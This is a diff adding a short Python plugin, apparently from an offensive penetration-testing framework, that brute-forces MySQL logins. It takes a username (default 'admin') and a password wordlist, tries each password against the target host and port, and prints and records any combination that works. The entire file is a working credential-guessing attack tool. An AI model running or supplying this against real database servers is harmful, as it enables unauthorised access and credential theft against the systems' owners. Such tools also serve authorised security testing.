@@ -1,0 +1,24 @@
+Description = 'Bruteforce SQL Protocol.'
+
+from plugin_support import *
+import MySQLdb
+
+try:
+	df = "admin"
+	users = raw_input(success("Enter user [" + df + "]: ")) or df
+	passlist = raw_input(success("Enter passlist directory: "))
+	NET.CheckConnectionHost(ask.target,ask.LPORT,5)
+	Loadingfile(passlist)
+
+	with open(passlist,'r') as passwords:
+		for password in passwords:
+			password=password.replace("\n","")
+			try:
+				MySQLdb.connect(ask.target,users,password,'',int(ask.LPORT))
+				if True:
+					success("Successfully with ["+users+"]["+password+"]\n")
+					UTIL.sRegister(init,password)
+			except:
+				fail(" | Checking '"+password+"'")
+except KeyboardInterrupt:
+	exit()
